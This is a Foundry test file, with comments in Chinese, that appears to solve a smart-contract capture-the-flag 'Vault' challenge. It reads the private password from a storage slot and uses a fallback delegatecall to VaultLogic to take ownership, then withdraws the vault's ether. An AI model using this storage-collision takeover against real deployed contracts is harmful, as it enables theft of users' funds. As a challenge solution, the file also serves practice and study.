// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address player = address(0x1234);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.4 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(player, 1 ether);
        vm.startPrank(player);
        vault.deposite{value: 0.1 ether}();
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        // Step 2: 构造 changeOwner 调用的数据（注意：Vault 没有该函数，会 fallback）
        bytes memory payload = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            password,
            player // 把 player 设置为 Vault 的 owner
        );
        // Step 3: 使用低级调用，触发 Vault fallback → delegatecall 到 VaultLogic
        (bool success, ) = address(vault).call(payload);
        require(success, "delegatecall failed");
        assertEq(vault.owner(), player, "delegatecall did not change owner");

        // Step 4: 现在 player 是 owner，开启提款功能
        vault.openWithdraw();

        // Step 5: 提现player的资金
        vault.withdraw();
        vm.stopPrank();
        
        // Step 6: 切换到owner身份提现owner的资金
        vm.startPrank(owner);
        vault.withdraw();
        vm.stopPrank();

        require(vault.isSolve(), "solved");
    }
}
